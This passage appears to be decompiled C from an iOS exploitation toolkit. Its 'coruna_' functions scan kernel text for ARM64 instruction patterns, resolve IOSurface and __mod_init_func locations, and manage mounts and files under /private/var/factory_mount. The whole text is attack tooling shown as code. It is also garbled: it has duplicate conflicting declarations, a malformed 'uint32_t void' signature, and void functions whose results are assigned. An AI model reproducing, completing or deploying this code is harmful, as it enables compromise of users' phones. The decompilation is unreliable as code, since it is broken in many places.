      if (u < 2) {
        handle = -8;
      }
      if (addr == 0) {
        return;
      }
      size = addr + handle;
    }
    else {
      coruna_macho_text_sect(bootargs,handle);
      handle = coruna_strsep(bootargs,".. FD .. D3 .. 00 00 B5",0,1);
      if (handle == 0) {
        return;
      }
      size = handle + 8;
    }
  }
  else {
    coruna_macho_text_sect(thread_attr,handle);
    handle = coruna_strsep(thread_attr,"08 FD 64 D3 1F 21 00 F1 .. 00 00 54",0,1);
    if (handle == 0) {
      return;
    }
    size = handle + 0xc;
  }
  coruna_return_zero_15ca0(handle,size & 0xfffffffffffffffc,1);
  return;
}





uint64_t coruna_iosurface_gen_index(long handle)
{
  int err;
  
  err = *(int *)(handle + 0x70);
  if (err < 0x2258) {
    if (err - 0x1f53U < 2) {
      return 4;
    }
    if (err == 0x1809) {
      return 2;
    }
    if (err == 0x1c1b) {
      return 3;
    }
  }
  else {
    if (err == 0x2258 || err == 0x225c) {
      return 5;
    }
    if (err == 0x2712) {
      return 6;
    }
  }
  return 0;
}





void coruna_return_zero_15ca0_stub(uint64_t val,unsigned long arg)
{
  coruna_return_zero_15ca0(val,arg & 0xfffffffffffffffc,1);
  return;
}





void coruna_find_mod_init(uint64_t val)
{
  char *ptr;
  char *buf;
  uint u;
  unsigned long size;
  long handle;
  uint64_t scratch;
  unsigned long scratch;
  long bootargs;
  uint8_t thread_attr[8];
  long host_info;
  long serial_buf;
  uint64_t action;
  unsigned long bootargs;
  long block_ctx;
  
  u = coruna_iosurface_gen_index();
  coruna_macho_text_sect(&action,val);
  coruna_macho_map_segsect(thread_attr,val,"__DATA_CONST","__mod_init_func");
  if ((((host_info != 0 && serial_buf != 0) && (size = coruna_kernel600c_trampoline_00012ad4(val), size != 0)) &&
      (bootargs < size)) && (size < block_ctx + bootargs)) {
    block_ctx = (bootargs - size) + block_ctx;
    bootargs = size;
  }
  ptr = "68 72 40 B9 08 01 19 32 68 72 00 B9";
  if (u != 1) {
    ptr = (char *)0x0;
  }
  buf = "68 82 40 B9 08 01 19 32 68 82 00 B9";
  if (u < 2) {
    buf = ptr;
  }
  scratch = bootargs;
  scratch = action;
  bootargs = block_ctx;
  handle = coruna_strsep(&scratch,buf,0,1);
  if ((handle != 0) &&
     (handle = coruna_return_zero_15ca0(val,handle + 0xcU & 0xfffffffffffffffc,1), handle != 0)) {
    coruna_kernel600c_trampoline_00012ad4(val,handle);
  }
  return;
}





uint64_t coruna_kernel600c_str_e0_03_15_aa_fe_03_13_aa(uint64_t val)
{
  uint u;
  long handle;
  unsigned long size;
  uint64_t version;
  unsigned long port;
  uint8_t scratch[24];
  
  coruna_macho_text_sect(scratch);
  handle = coruna_strsep(scratch,"E0 03 15 AA .. .. .. .. FE 03 13 AA",0,1);
  if ((handle != 0) && (handle = coruna_kernel600c_via_kernel600c_via_ioservice_open_path(val,handle + 4), handle != 0)) {
    port = 0xfffffffffffffffc;
    do {
      u = coruna_kernel600c_via_ioservice_open_path(val,handle + port + 4);
      if (((u & 0x9f000000) == 0x90000000) &&
         (size = coruna_kernel600c_via_ioservice_open_path(val,handle + port + 0xc),
         ((uint)(size >> 0x15) & 0x7ff) == 0x458)) {
        version = coruna_return_zero_15ca0(val,handle + port + 4,1);
        return version;
      }
      port = port + 4;
    } while (port < 0xfc);
  }
  return 0;
}





long coruna_kernel600c_via_kernel600c_via_ioservice_open_path(uint64_t val,long handle)
{
  unsigned long u;
  unsigned long size;
  
  size = coruna_kernel600c_via_ioservice_open_path();
  if (((uint)size & 0x7c000000) == 0x14000000) {
    u = (unsigned long)((uint)size & 0x1ffffff);
    if ((size & 0x2000000) != 0) {
      u = size | 0xfffffffffe000000;
    }
    if (u != 0) {
      return handle + u * 4;
    }
  }
  return 0;
}





void coruna_return_zero_15ca0_stub_2(uint64_t val,uint64_t id_2)
{
  coruna_return_zero_15ca0(val,id_2,1);
  return;
}





long coruna_return_zero_15aac(long handle,uint32_t *size)
{
  int err;
  long handle;
  uint64_t u;
  long addr;
  long off;
  uint64_t scratch;
  long bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  long serial_buf;
  long action;
  
  off = *(long *)(handle + 0x118);
  err = coruna_ctx_test_flag(off,0x20);
  if (err == 0) {
    handle = coruna_kernel600c_str_e0_03_15_aa_fe_03_13_aa(handle);
    if (handle == 0) {
      return 0;
    }
    scratch = 8;
fail:
    *size = (int)scratch;
  }
  else {
    coruna_macho_text_sect(&host_info,*(uint64_t *)(&k_kernel_slot_19f8 + off));
    bootargs = serial_buf + action + -0x20000;
    action = 0x20000;
    scratch = host_info;
    thread_attr = 0x20000;
    serial_buf = bootargs;
    handle = coruna_strsep(&scratch,"2B 09 40 B9 4B 39 0B 8B",0,1);
    if ((handle != 0) && (handle = coruna_return_zero_15ca0(handle,handle + -0x28,1), handle != 0)) {
      u = coruna_kernel600c_trampoline_00012ad4(handle,handle + -8);
      addr = coruna_ptr_canonicalize(off,u);
      if ((addr != 0) &&
         ((err = coruna_kernel600c_via_kernel600c_via_fd_read_full(off,u,&scratch), err != 0 && ((int)scratch - 1U < 0x20))))
      {
        handle = coruna_kernel600c_trampoline_00012ad4(handle,handle);
        off = coruna_ptr_canonicalize(off,handle);
        if (off != 0) {
          goto fail;
        }
      }
    }
    handle = 0;
  }
  return handle;
}





long coruna_return_zero_15be8(long handle,int flags)
{
  long handle;
  char *ptr;
  char *buf;
  uint u;
  long addr;
  uint64_t size;
  uint8_t scratch[24];
  
  if (flags < 1) {
    handle = handle + (long)flags * 8;
    if (*(long *)(&k_kernel_slot_1960 + handle) != 0) {
      return *(long *)(&k_kernel_slot_1960 + handle);
    }
    if (flags == 0) {
      size = *(uint64_t *)(&k_kernel_slot_19f8 + handle);
      u = coruna_iosurface_gen_index(size);
      coruna_macho_text_sect(scratch,size);
      ptr = "09 .. 00 F9 E1 03 00 32 00 00 80 52";
      if (u != 1) {
        ptr = (char *)0x0;
      }
      buf = "09 .. 00 F9 00 00 80 52 E1 03 00 32";
      if (u < 2) {
        buf = ptr;
      }
      addr = coruna_strsep(scratch,buf,0,0);
      if (addr == 0) {
        return 0;
      }
      addr = coruna_kernel600c_via_kernel600c_via_ioservice_open_path(size,addr + 0xc);
      if (addr == 0) {
        return 0;
      }
      *(long *)(&k_kernel_slot_1960 + handle) = addr;
      return addr;
    }
  }
  return 0;
}





long coruna_return_zero_15ca0(uint64_t val,unsigned long arg,int flags)
{
  uint u;
  int err;
  uint size;
  unsigned long version;
  uint64_t port;
  unsigned long tag;
  long handle;
  bool err;
  
  if ((arg & 3) == 0) {
    version = coruna_kernel600c_via_ioservice_open_path();
    u = (uint)version;
    if (u == 0xd503201f) {
      port = coruna_kernel600c_via_ioservice_open_path(val,arg + 4);
      u = (uint)port >> 5;
      version = (unsigned long)(u & 0x7ffff) << 2;
      if ((u & 0x40000) != 0) {
        version = version | 0xfffffffffff00000;
      }
      if (((uint)((unsigned long)port >> 0x18) & 0xff) != 0x58) {
        return 0;
      }
      return version + arg + 4;
    }
    if ((u & 0x9f000000) == 0x90000000) {
      handle = (arg & 0xfffffffffffff000) +
              (long)(int)(u >> 0x11 & 0x3000 | (u >> 5) << 0xe);
    }
    else {
      if (((u & 0x9f000000) != 0x10000000) ||
         (err = coruna_kernel600c_via_ioservice_open_path(val,arg + 4), err != -0x2afcdfe1)) goto fail;
      tag = (unsigned long)((uint)(version >> 3) & 0x1ffffc | u >> 0x1d & 3);
      if ((version >> 3 & 0x100000) != 0) {
        tag = tag | 0xffffffffffe00000;
      }
      handle = tag + arg;
    }
    err = false;
    u = u & 0x1f;
    version = arg + 0x20;
    while( true ) {
      arg = arg + 4;
      size = coruna_kernel600c_via_ioservice_open_path(val,arg);
      if (((size & 0x7f000000) == 0x11000000) && (!err)) {
        if ((size >> 5 & 0x1f) == u) {
          tag = (unsigned long)(size >> 10 & 0xfff);
          if ((size & 0xc00000) != 0) {
            tag = tag << 0xc;
          }
          handle = tag + handle;
          if (flags == 0) {
            return handle;
          }
          if (u != (size & 0x1f)) {
            return handle;
          }
          err = true;
        }
        else {
          err = false;
        }
      }
      if (((size & 0xbfc00000) == 0xb9400000) && ((size >> 5 & 0x1f) == u)) break;
      if ((size & 0xffc00000) == 0xb9800000) {
        if ((size >> 5 & 0x1f) == u) {
          version = (unsigned long)(size >> 8 & 0x3ffc);
          goto done;
        }
      }
      else if (((size & 0xffc00000) == 0x39400000) && ((size >> 5 & 0x1f) == u)) {
        version = (unsigned long)(size >> 10 & 0xfff);
        goto done;
      }
      if (size == 0xd65f03c0) {
        return handle;
      }
      if (version < arg) {
        return handle;
      }
    }
    version = (unsigned long)(size >> 10 & 0xfff) << (size >> 0x1e);
done:
    handle = handle + version;
  }
  else {
fail:
    handle = 0;
  }
  return handle;
}





void coruna_host_kernel_version(char *path,unsigned long arg)
{
  mach_port_t host;
  uint u;
  int err;
  int *err;
  uint *ptr;
  size_t ls5;
  uint64_t scratch;
  size_t bootargs;
  char scratch [512];
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  if (800.0 <= *(double *)k_kernel_dyldversionnumber_slot) {
    scratch = k_kernel_rodata_word_374c8;
    bootargs = 0x200;
    err = _sysctl((int *)&scratch,2,scratch,&bootargs,(void *)0x0,0);
    if (err != 0) {
      err = ___error();
      err = *err;
      ptr = (uint *)___error();
      u = -*ptr;
      if (-1 < err) {
        u = *ptr;
      }
      u = u | 0x40000000;
      if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
      return;
      }
      ___stack_chk_fail(u);
    }
  }
  else {
    host = _mach_host_self();
    u = _host_kernel_version(host,scratch);
    if (u != 0) {
      u = u | 0x80000000;
      if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
      return;
      }
      ___stack_chk_fail(u);
    }
  }
  ls5 = _strlen(scratch);
  if (arg < ls5 + 1) {
    u = 0xad00c;
  }
  else {
    _strlcpy(path,scratch,arg);
    u = 0;
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(u);
}





void coruna_parse_xnu_five(uint64_t *val,uint32_t *size,uint32_t *flags_2)
{
  int err;
  char *ptr;
  size_t ls3;
  int *err;
  uint64_t u;
  char *buf;
  uint64_t scratch;
  char scratch [512];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = 0;
  if (k_kernel_rodata_word_374d0 <= *(double *)k_kernel_dyldversionnumber_slot) {
    ___strlcpy_chk(scratch,k_kernel_kernelversionstring_slot,0x200,0x200);
    ls3 = _strlen(scratch);
    u = 0;
    if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
    }
    ___stack_chk_fail(u);
  }
  else {
    err = coruna_host_kernel_version(scratch,0x200);
    if (err == 0) {
      ptr = _strstr(scratch,"RELEASE");
      u = 0;
      if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
      return;
      }
      ___stack_chk_fail(u);
    }
  }
  u = 0;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
  }
  ___stack_chk_fail(u);
}





uint64_t coruna_mach_vm_page_info(vm_map_t arg,mach_vm_address_t arg_x,uint64_t *val)
{
  kern_return_t lk1;
  mach_msg_type_number_t scratch;
  int bootargs [2];
  uint64_t thread_attr;
  uint64_t host_info;
  
  scratch = 8;
  lk1 = _mach_vm_page_info(arg,arg_x,1,bootargs,&scratch);
  if (lk1 == 0) {
    if (val != (uint64_t *)0x0) {
      *val = host_info;
    }
  }
  else {
    thread_attr = 0;
  }
  return thread_attr;
}





uint coruna_cpu_core_count(void)
{
  uint u;
  
  u = __get_cpu_capabilities();
  return u >> 0x10 & 0xff;
}





uint64_t coruna_kernel600c_via_cpu_capabilities_base(void)
{
  long handle;
  uint64_t u;
  
  handle = coruna_cpu_capabilities_base();
  u = 0;
  if (handle != 0) {
    u = *(uint64_t *)(handle + 0x38);
  }
  return u;
}





uint32_t coruna_host_page_size(void)
{
  mach_port_t lm1;
  kern_return_t lk2;
  uint32_t scratch[2];
  
  lm1 = _mach_host_self();
  lk2 = _host_page_size(lm1,(vm_size_t *)scratch);
  if (lk2 != 0) {
    scratch[0] = 0;
  }
  return scratch[0];
}





uint32_t coruna_task_info_162a0(task_name_t arg)
{
  kern_return_t lk1;
  mach_msg_type_number_t scratch;
  integer_t bootargs [3];
  uint32_t thread_attr;
  
  scratch = 0x24;
  lk1 = _task_info(arg,0x16,bootargs,&scratch);
  if (lk1 != 0) {
    thread_attr = 0;
  }
  return thread_attr;
}





uint coruna_kernel600c_residual_223(void)
{
  uint64_t u;
  uint size;
  uint version;
  
  if (k_kernel_rodata_word_37788 <= *(double *)k_kernel_dyldversionnumber_slot) {
    size = 0xfff;
    u = tpidr_el0;
    version = (uint)u;
  }
  else {
    size = 7;
    u = tpidrro_el0;
    version = (uint)u;
  }
  return size & version;
}





kern_return_t coruna_task_info_1631c(task_name_t arg,uint64_t *val,uint64_t *id_2)
{
  kern_return_t lk1;
  mach_msg_type_number_t scratch;
  integer_t bootargs [38];
  uint64_t thread_attr;
  uint64_t scratch;
  
  scratch = 0x2a;
  lk1 = _task_info(arg,0x16,bootargs,&scratch);
  if (lk1 == 0) {
    if (scratch == 0x2a) {
      lk1 = 0;
      *val = thread_attr;
      *id_2 = scratch;
    }
    else {
      lk1 = 4;
    }
  }
  return lk1;
}





bool coruna_kernel600c_via_cpu_capabilities_base_2(uint32_t *size)
{
  long handle;
  
  handle = coruna_cpu_capabilities_base();
  if (handle != 0) {
    *size = *(uint32_t *)(handle + 0x80);
  }
  return handle != 0;
}





uint64_t coruna_iomfb_slot_read(uint size,uint64_t *val)
{
  uint64_t *ptr;
  uint32_t *buf;
  uint64_t u;
  
  u = 0xad009;
  if (size < 4) {
    u = 0xad001;
  }
  else {
    ptr = _calloc(0x10,1);
    if (ptr != (uint64_t *)0x0) {
      buf = _calloc((unsigned long)size,1);
      *ptr = buf;
      if (buf == (uint32_t *)0x0) {
        _free(ptr);
      }
      else {
        u = 0;
        *buf = 0xd3;
        *(uint32_t *)(ptr + 1) = 4;
        *(uint *)((long)ptr + 0xc) = size;
        *val = ptr;
      }
    }
  }
  return u;
}





uint64_t coruna_return_zero_16450(long *handle,uint size,uint flags_2,uint64_t *val)
{
  uint64_t u;
  uint size;
  long handle;
  uint version;
  
  u = 0xad001;
  if ((flags_2 & 0xff000000) == 0) {
    size = (size & 0x7f000000) - 0x1000000 >> 0x18;
    if (size < 0xc) {
      version = 1 << (unsigned long)(size & 0x1f);
      if ((version & 0xc07) == 0) {
        if ((version & 0x380) == 0) {
          if (size != 3) {
            return 0xad001;
          }
          size = 0xc;
        }
        else {
          size = flags_2 + 7 & 0xfffffffc;
        }
      }
      else {
        size = 4;
      }
      if (*(int *)((long)handle + 0xc) - *(uint *)(handle + 1) < size) {
        u = 0xad00c;
      }
      else {
        handle = *handle;
        *(uint *)(handle + (unsigned long)*(uint *)(handle + 1)) = flags_2 | size;
        size = (int)handle[1] + 4;
        *(uint *)(handle + 1) = size;
        version = (size & 0x7f000000) + 0xfc000000 >> 0x18;
        if (version - 4 < 3) {
          version = flags_2 + 3 & 0xfffffffc;
          _memcpy((void *)(handle + (unsigned long)size),val,(unsigned long)flags_2);
        }
        else {
          if (version != 0) {
            return 0;
          }
          *(uint64_t *)(handle + (unsigned long)size) = *val;
          version = 8;
        }
        u = 0;
        *(uint *)(handle + 1) = (int)handle[1] + version;
      }
    }
  }
  return u;
}





uint64_t coruna_memcpy_1655c(long *handle,uint64_t *val,uint32_t *size)
{
  uint u;
  void *ptr;
  uint64_t size;
  
  size = 0xad001;
  if (((*handle != 0) && (u = *(uint *)(handle + 1), u != 0)) &&
     (*(int *)((long)handle + 0xc) != 0)) {
    ptr = _malloc((unsigned long)u);
    *val = ptr;
    if (ptr == (void *)0x0) {
      size = 0xad009;
    }
    else {
      _memcpy(ptr,(void *)*handle,(unsigned long)u);
      size = 0;
      *size = (int)handle[1];
    }
  }
  return size;
}





uint64_t coruna_free_165e4(uint64_t *val)
{
  if ((void *)*val != (void *)0x0) {
    _free((void *)*val);
  }
  *val = 0;
  val[1] = 0;
  _free(val);
  return 0;
}





uint coruna_pipe_open(int *flags)
{
  int err;
  uint u;
  int *err;
  uint *ptr;
  
  err = _pipe((int)flags);
  if (err == 0) {
    if ((*flags == -1) || (flags[1] == -1)) {
      u = 0x2802a;
    }
    else {
      u = 0;
    }
  }
  else {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  return u;
}





void coruna_fd_drain(int *flags)
{
  int err;
  uint u;
  ssize_t ls3;
  int *err;
  uint *ptr;
  uint8_t scratch[256];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  do {
    ls3 = _read(*flags,scratch,0x100);
  } while (0 < ls3);
  err = ___error();
  if (*err == 0x23) {
    u = 0;
  }
  else {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
  }
  ___stack_chk_fail(u);
}





void coruna_call_fcntl(uint32_t *size)
{
  int err;
  
  err = coruna_fcntl(*size);
  if (err != 0) {
    return;
  }
  coruna_fcntl(size[1]);
  return;
}





uint coruna_fcntl(int flags)
{
  int err;
  uint u;
  int *err;
  uint *ptr;
  
  if (flags == -1) {
    u = 0xad001;
  }
  else {
    err = _fcntl(flags,0x49);
    if ((((err != -1) && (err = _fcntl(flags,1), err != -1)) &&
        (err = _fcntl(flags,2), err != -1)) &&
       ((err = _fcntl(flags,3), err != -1 && (err = _fcntl(flags,4), err != -1)))) {
      return 0;
    }
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  return u;
}





uint coruna_write(long handle,void *ctx,size_t len)
{
  uint u;
  int err;
  size_t ls3;
  int *err;
  uint *ptr;
  
  ls3 = _write(*(int *)(handle + 4),ctx,len);
  if ((long)ls3 < 0) {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  else {
    u = 0;
    if (ls3 != len) {
      u = 0x2803a;
    }
  }
  return u;
}





uint coruna_fd_read_full(int *flags,void *ctx,size_t len)
{
  uint u;
  int err;
  size_t ls3;
  int *err;
  uint *ptr;
  
  ls3 = _read(*flags,ctx,len);
  if ((long)ls3 < 0) {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  else {
    u = 0;
    if (ls3 != len) {
      u = 0x2803b;
    }
  }
  return u;
}





void coruna_kernel600c_via_mount_119b0(uint64_t *val)
{
  int err;
  int *err;
  uint *ptr;
  uint u;
  
  err = coruna_mount_119b0(val[1],*val,0);
  if (err == 0) {
    u = 0;
  }
  else {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  *(uint *)(val + 2) = u;
  return;
}





void coruna_factory_mount(uint *size)
{
  int err;
  int *err;
  uint *ptr;
  uint u;
  
  err = _mkdir("/private/var/factory_mount",0x1ff);
  if ((err == 0) || (err = ___error(), *err == 0x11)) {
    u = 0;
  }
  else {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  *size = u;
  return;
}





void coruna_mmap_anon_cb(uint32_t *size)
{
  int err;
  long handle;
  int *err;
  uint *ptr;
  uint u;
  
  handle = _mmap(*(uint64_t *)(size + 2),*(uint64_t *)(size + 4),size[6],0x12,*size,
                *(uint64_t *)(size + 8));
  if (handle == -1) {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  else {
    u = 0;
  }
  size[10] = u;
  return;
}





uint32_t
void coruna_kernel600c_via_pthread_join_2f17c(uint64_t val,uint32_t size,uint64_t id_2,uint64_t size_3,
            uint32_t flags_2,uint64_t off_4)
{
  uint32_t u;
  int err;
  uint32_t scratch[2];
  uint64_t bootargs;
  uint64_t scratch;
  uint32_t thread_attr;
  uint64_t host_info;
  uint32_t serial_buf;
  
  serial_buf = 0xad001;
  scratch[0] = size;
  bootargs = id_2;
  scratch = size_3;
  thread_attr = flags_2;
  host_info = off_4;
  err = coruna_pthread_join_2f17c(val,coruna_mmap_anon_cb,scratch);
  u = 0x28003;
  if (err != 0) {
    u = serial_buf;
  }
  return u;
}





void coruna_unlink(int *flags)
{
  int err;
  int status;
  int *err;
  uint *ptr;
  uint u;
  char scratch [1025];
  long scratch;
  
  scratch = *(long *)k_kernel_stack_chk_guard_slot;
  status = *flags;
  _bzero(scratch,0x401);
  err = _fcntl(status,0x32);
  if ((err == 0) && (err = _unlink(scratch), err == 0)) {
    status = _close(status);
    if (status == 0) {
      u = 0;
      flags[1] = u;
      if (*(long *)k_kernel_stack_chk_guard_slot == scratch) {
      return;
      }
      ___stack_chk_fail();
    }
  }
  err = ___error();
  status = *err;
  ptr = (uint *)___error();
  u = -*ptr;
  if (-1 < status) {
    u = *ptr;
  }
  u = u | 0x40000000;
fail:
  flags[1] = u;
  if (*(long *)k_kernel_stack_chk_guard_slot == scratch) {
    return;
  }
  ___stack_chk_fail();
}





uint32_t coruna_call_pthread_join_2f17c(uint64_t val,uint32_t size)
{
  uint32_t u;
  int err;
  uint32_t scratch;
  uint32_t bootargs;
  
  bootargs = 0xad001;
  scratch = size;
  err = coruna_pthread_join_2f17c(val,coruna_unlink,&scratch);
  u = 0x28003;
  if (err != 0) {
    u = bootargs;
  }
  return u;
}





uint32_t coruna_kernel600c_via_pthread_join_2f17c_2(uint64_t val,uint64_t id_2,uint32_t size,uint64_t size_3)
{
  uint32_t u;
  int err;
  uint64_t scratch;
  uint32_t bootargs;
  uint64_t thread_attr;
  uint32_t host_info;
  
  host_info = 0xad001;
  scratch = id_2;
  bootargs = size;
  thread_attr = size_3;
  err = coruna_pthread_join_2f17c(val,coruna_open_dprotected_np,&scratch);
  u = 0x28003;
  if (err != 0) {
    u = host_info;
  }
  return u;
}





void coruna_open_dprotected_np(uint64_t *val)
{
  bool err;
  int err;
  int status;
  uint u;
  uint size;
  uint *ptr;
  char *ptr;
  unsigned long version;
  int *err;
  void *ptr;
  int *status;
  char scratch [1024];
  uint8_t scratch[2168];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  ptr = (void *)*val;
  size = *(uint *)(val + 1);
  status = (int *)val[2];
  _bzero(scratch,0x878);
  ptr = (uint *)coruna_factory_mount_16e60(scratch);
  u = (uint)ptr;
  if (u == 0) {
    _snprintf(scratch,0x400,"%s/temp.XXXXXX");
    ptr = _mktemp(scratch);
    if (ptr != (char *)0x0) {
      err = _open_dprotected_np(ptr,0x602,4,0);
      if (-1 < err) {
        u = 0;
        do {
          version = _write(err,ptr,(unsigned long)size);
          if (version != 0xffffffffffffffff) {
            u = 0x1b005;
            {
              _close(err);
              size = _unlink(ptr);
              ptr = (uint *)(unsigned long)size;
              *(uint *)(val + 3) = u;
              if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
              return;
              }
              ___stack_chk_fail(ptr);
            }
            status = _open(ptr,0);
            if (-1 < status) {
              *status = status;
              u = _close(err);
              ptr = (uint *)(unsigned long)u;
              u = 0;
              *(uint *)(val + 3) = u;
              if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
              return;
              }
              ___stack_chk_fail(ptr);
            }
            status = ___error();
            status = *status;
            ptr = (uint *)___error();
            u = -*ptr;
            if (-1 < status) {
              u = *ptr;
            }
            u = u | 0x40000000;
            {
              _close(err);
              size = _unlink(ptr);
              ptr = (uint *)(unsigned long)size;
              *(uint *)(val + 3) = u;
              if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
              return;
              }
              ___stack_chk_fail(ptr);
            }
          }
          err = ___error();
        } while ((*err == 4) && (err = u < 100, u = u + 1, err));
        u = 0x1b005;
fail:
        _close(err);
        size = _unlink(ptr);
        ptr = (uint *)(unsigned long)size;
        *(uint *)(val + 3) = u;
        if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
        return;
        }
        ___stack_chk_fail(ptr);
      }
    }
    status = ___error();
    err = *status;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
done:
  *(uint *)(val + 3) = u;
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
  }
  ___stack_chk_fail(ptr);
}





void coruna_bzero_4(uint64_t val)
{
  int err;
  int status;
  uint8_t *scratch;
  uint64_t scratch;
  int bootargs;
  uint8_t thread_attr[88];
  uint8_t host_info[1024];
  uint8_t serial_buf[1056];
  long action;
  
  action = *(long *)k_kernel_stack_chk_guard_slot;
  _bzero(thread_attr,0x878);
  err = coruna_factory_mount_16e60(thread_attr);
  if (err == 0) {
    scratch = host_info;
    scratch = 0;
    bootargs = 0xad001;
    err = coruna_pthread_join_2f17c(val,coruna_unmount,&scratch);
    status = 0xad00b;
    if (err != 0) {
      status = bootargs;
    }
    if (status == 0) {
      scratch = serial_buf;
      scratch = 0;
      bootargs = 0xad001;
      err = coruna_pthread_join_2f17c(val,coruna_ioctl,&scratch);
      status = 0xad00b;
      if (err != 0) {
        status = bootargs;
      }
    }
  }
  else {
    status = 0;
    if (err != 0xad011) {
      status = err;
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != action) {
    ___stack_chk_fail(status);
  }
  return;
}





uint coruna_factory_mount_16e60(statfs *arg)
{
  int err;
  int *err;
  uint *ptr;
  uint u;
  
  err = _statfs("/private/var/factory_mount",arg);
  u = 0xad011;
  if (err == 0) {
    err = _strcmp("/private/var/factory_mount",arg->f_mntonname);
    if (err == 0) {
      err = _strcmp("hfs",arg->f_fstypename);
      u = 0;
      if (err != 0) {
        u = 0xad005;
      }
    }
  }
  else {
    err = ___error();
    if (*err != 2) {
      err = ___error();
      err = *err;
      ptr = (uint *)___error();
      u = -*ptr;
      if (-1 < err) {
        u = *ptr;
      }
      u = u | 0x40000000;
    }
  }
  return u;
}
unsigned long coruna_plist_dict(long arg)

{
  int fd_11;
  uint type_id_17;
  int fd_12;
  unsigned long size;
  long serial_13;
  size_t ls6;
  long serial_18;
  long serial_17;
  long serial_10;
  uint64_t *******lpppppppu10;
  void *entry_13;
  uint64_t kind;
  uint64_t type_id_22;
  uint64_t *******lpppppppu14;
  uint64_t type_id_23;
  unsigned long type_id;
  uint64_t *******cache_83;
  uint cache_84;
  uint8_t cache_85[2168];
  char *cache_22;
  char *cache_35;
  uint64_t *******cache_36;
  uint64_t cache_79;
  stat cache_23;
  long cache_75;
  
  cache_75 = *(long *)k_kernel_stack_chk_guard_slot;
  _bzero(cache_85,0x878);
  size = coruna_factory_mount_16e60(cache_85);
  if (*(long *)k_kernel_stack_chk_guard_slot != cache_75) {
  ___stack_chk_fail();
  }
  return size;
}





void coruna_strlcpy(uint64_t val,uint32_t *size,char *path)
{
  uint64_t u;
  uint8_t scratch[88];
  char scratch [2080];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  _bzero(scratch,0x878);
  u = coruna_factory_mount_16e60(scratch);
  if ((int)u == 0xad011) {
    u = 0;
    *size = 0;
    *path = '\0';
  }
  else if ((int)u == 0) {
    *size = 4;
    _strlcpy(path,scratch,0x400);
    u = 0;
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
  }
  ___stack_chk_fail(u);
}





uint32_t coruna_kernel600c_residual_224(void)
{
  uint32_t u;
  int err;
  
  err = coruna_kernel600c_via_kernel600c_via_free_17fd4();
  u = 0xad00b;
  if (err != 0) {
    u = 0;
  }
  return u;
}





uint * coruna_unmount(uint64_t *val)
{
  uint u;
  bool err;
  int err;
  uint size;
  int *err;
  uint *ptr;
  uint version;
  
  version = 0;
  do {
    err = _unmount((char *)*val,0x80000);
    if (err == 0) {
      ptr = (uint *)0x0;
      size = 0;
      break;
    }
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    size = u | 0x40000000;
    if ((u | 0x40000000) != 0x40000010) break;
    size = _usleep(200);
    ptr = (uint *)(unsigned long)size;
    err = version < 4;
    size = 0x40000010;
    version = version + 1;
  } while (err);
  *(uint *)(val + 2) = size;
  return ptr;
}





uint * coruna_ioctl(uint64_t *val)
{
  int err;
  int status;
  uint u;
  uint *ptr;
  int *err;
  char *ptr;
  uint size;
  stat scratch;
  
  scratch.st_gen = 0;
  scratch.st_lspare = 0;
  scratch.st_blksize = 0;
  scratch.st_flags = 0;
  scratch.st_qspare[1] = 0;
  scratch.st_qspare[0] = 0;
  scratch.st_birthtimespec.tv_nsec = 0;
  scratch.st_birthtimespec.tv_sec = 0;
  scratch.st_blocks = 0;
  scratch.st_size = 0;
  scratch.st_mtimespec.tv_nsec = 0;
  scratch.st_mtimespec.tv_sec = 0;
  scratch.st_ctimespec.tv_nsec = 0;
  scratch.st_ctimespec.tv_sec = 0;
  scratch.st_rdev = 0;
  scratch = 0;
  scratch.st_uid = 0;
  scratch.st_gid = 0;
  scratch.st_atimespec.tv_nsec = 0;
  scratch.st_atimespec.tv_sec = 0;
  scratch.st_ino = 0;
  scratch.st_dev = 0;
